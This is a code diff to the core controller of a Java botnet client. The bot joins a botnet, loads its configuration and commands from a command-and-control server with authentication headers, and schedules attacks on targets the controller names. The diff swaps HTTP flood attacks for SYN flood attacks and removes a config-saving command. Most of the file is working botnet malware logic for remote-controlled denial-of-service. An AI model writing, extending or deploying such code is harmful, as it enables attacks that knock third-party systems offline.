@@ -32,11 +32,13 @@ import com.acmutv.botnet.config.serial.AppConfigurationFormat;
 import com.acmutv.botnet.core.analysis.Analyzer;
 import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
 import com.acmutv.botnet.core.analysis.SystemAnalyzer;
-import com.acmutv.botnet.core.attack.HttpAttack;
+import com.acmutv.botnet.core.attack.SynFloodAttack;
 import com.acmutv.botnet.core.control.Controller;
+import com.acmutv.botnet.core.control.ControllerService;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.BotCommandService;
 import com.acmutv.botnet.core.control.command.CommandScope;
+import com.acmutv.botnet.core.control.serial.ControllerPropertiesFormat;
 import com.acmutv.botnet.core.exception.*;
 import com.acmutv.botnet.core.exec.BotPool;
 import com.acmutv.botnet.core.exec.ResourceReleaser;
@@ -227,8 +229,7 @@ public class CoreController {
    */
   private static void joinBotnet() throws BotInitializationException {
     if (AppConfigurationService.getConfigurations().getControllers().isEmpty()) {
-      LOGGER.warn("No controller specified. Loading fallback controller...");
-      AppConfigurationService.getConfigurations().getControllers().add(AppConfiguration.FALLBACK_CONTROLLER);
+      throw new BotInitializationException("No controller specified.");
     }
     LOGGER.info("Joining botnet...");
     boolean success = false;
@@ -240,19 +241,17 @@ public class CoreController {
       final String initResource = controller.getInitResource();
       LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
       try {
+        InputStream in;
         if (HttpManager.isHttpUrl(initResource)) {
           HttpMethod method = HttpMethod.GET;
           URL url = new URL(initResource);
-          Map<String,String> props = new HashMap<String,String>(){{put("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());}};
-          try (InputStream in =
-                   HttpManager.getResponseBodyAsInputStream(method, url, props)) {
-            AppConfigurationService.load(AppConfigurationFormat.JSON, in);
-          }
+          Map<String,String> props = controller.getAuthentication(new HashMap<>());
+          in = HttpManager.getResponseBodyAsInputStream(method, url, props);
         } else {
-          AppConfigurationService.load(AppConfigurationFormat.JSON, initResource);
+          in = IOManager.getInputStream(initResource);
         }
-        controllerId = 0;
-        controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
+        Map<String,String> furtherAuth = ControllerService.from(ControllerPropertiesFormat.JSON, in);
+        controller.getAuthentication().putAll(furtherAuth);
         success = true;
       } catch (IOException exc) {
         failures++;
@@ -292,13 +291,13 @@ public class CoreController {
 
     switch (cmd.getScope()) {
 
-      case ATTACK_HTTP:
+      case ATTACK_SYNFLOOD:
         if (!STATE.equals(BotState.EXECUTION)) {
           throw new BotExecutionException("Cannot execute command, because [STATE] is not [EXECUTION]");
         }
-        @SuppressWarnings("unchecked") final List<HttpAttack> httpAttacks = (List<HttpAttack>) cmd.getParams().get("attacks");
+        @SuppressWarnings("unchecked") final List<SynFloodAttack> httpAttacks = (List<SynFloodAttack>) cmd.getParams().get("attacks");
         if (httpAttacks == null) {
-          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [attacks] is null");
+          throw new BotMalformedCommandException("Cannot execute command ATTACK_SYNFLOOD: param [attacks] is null");
         }
 
         final Interval attackHttpDelay = (Interval) cmd.getParams().get("delay");
@@ -306,7 +305,7 @@ public class CoreController {
           delayCommand(attackHttpDelay.getRandomDuration(), CommandScope.KILL);
         }
 
-        for (HttpAttack attack : httpAttacks) {
+        for (SynFloodAttack attack : httpAttacks) {
           attackHttp(attack);
         }
 
@@ -352,6 +351,7 @@ public class CoreController {
 
 
       case RESTART:
+        //TODO review
         final String resource = (String) cmd.getParams().get("resource");
         if (resource == null || resource.isEmpty()) {
           throw new BotMalformedCommandException("Cannot execute command RESTART: param [resource] is null/empty");
@@ -365,16 +365,6 @@ public class CoreController {
         }
 
         restartBot(resource, restartWait);
-
-        break;
-
-      case SAVE_CONFIG:
-        final Interval saveConfigDelay = (Interval) cmd.getParams().get("delay");
-        if (saveConfigDelay != null) {
-          delayCommand(saveConfigDelay.getRandomDuration(), CommandScope.SAVE_CONFIG);
-        }
-
-        saveConfig();
 
         break;
 
@@ -398,6 +388,7 @@ public class CoreController {
         break;
 
       case UPDATE:
+        //TODO review
         @SuppressWarnings("unchecked") final Map<String,String> settings = (Map<String,String>) cmd.getParams().get("settings");
 
         final Interval updateDelay = (Interval) cmd.getParams().get("delay");
@@ -429,14 +420,13 @@ public class CoreController {
   }
 
   /**
-   * Executes command {@code ATTACK_HTTP}.
+   * Executes command {@code ATTACK_SYNFLOOD}.
    * @param attack the HTTP attack details.
    * @throws BotExecutionException when te attack cannot be scheduled.
    */
-  private static void attackHttp(HttpAttack attack) throws BotExecutionException {
+  private static void attackHttp(SynFloodAttack attack) throws BotExecutionException {
     LOGGER.traceEntry("attack={}", attack);
     LOGGER.info("Scheduling attack against {}...", attack.getTarget());
-    attack.getProperties().putIfAbsent("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());
     try {
       POOL.scheduleAttackHttp(attack);
     } catch (SchedulerException exc) {
@@ -521,6 +511,7 @@ public class CoreController {
    * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
    */
   private static void restartBot(String resource, boolean wait) throws BotExecutionException {
+    //TODO review
     LOGGER.info("Restarting bot with C&C at {}...", resource);
     AppConfiguration newConfig;
     try {
@@ -536,22 +527,7 @@ public class CoreController {
   }
 
   /**
-   * Executes command {@code SAVE_CONFIG}.
-   * @throws BotExecutionException when configuration cannot be saved.
-   */
-  private static void saveConfig() throws BotExecutionException {
-    final String configPath = AppConfigurationService.DEFAULT_CONFIG_FILENAME;
-    LOGGER.info("Saving current configuration to file {}...", configPath);
-    try {
-      AppConfigurationService.store(AppConfigurationFormat.YAML, configPath);
-    } catch (IOException exc) {
-      throw new BotExecutionException("Configuration cannot be saved. %s", exc.getMessage());
-    }
-    LOGGER.info("Current configuration saved to file {}...", configPath);
-  }
-
-  /**
-   * Executes command {@code ASLEEP}
+   * Executes command {@code SLEEP}
    * @param timeout the time period to sleep.
    * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
    */
@@ -587,15 +563,13 @@ public class CoreController {
   private static void update(Map<String,String> settings) throws BotExecutionException {
     LOGGER.info("Updating settings {}...", settings);
 
-    if (settings.containsKey("sleep")) {
-      final String sleepString = settings.get("sleep");
-      CronExpression sleep = null;
+    if (settings.containsKey(Controller.PROPERTY_SLEEP)) {
+      final String sleep = settings.get(Controller.PROPERTY_SLEEP);
       try {
-        if (sleepString == null) {
+        if (sleep == null) {
           POOL.removeSleepMode();
         } else {
-          sleep = new CronExpression(settings.get("sleep"));
-          POOL.setSleepMode(sleep);
+          POOL.setSleepMode(new CronExpression(sleep));
         }
       } catch (ParseException|SchedulerException exc) {
         throw new BotExecutionException("Cannot update [sleep]. %s", exc.getMessage());
@@ -647,8 +621,7 @@ public class CoreController {
       if (HttpManager.isHttpUrl(cmdResource)) {
         HttpMethod method = HttpMethod.GET;
         URL url = new URL(cmdResource);
-        Map<String,String> props = new HashMap<String,String>()
-        {{put("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());}};
+        Map<String,String> props = CONTROLLER.getAuthentication(new HashMap<String,String>());
         try (InputStream in =
                  HttpManager.getResponseBodyAsInputStream(method, url, props)) {
           cmd = BotCommandService.fromJson(in);
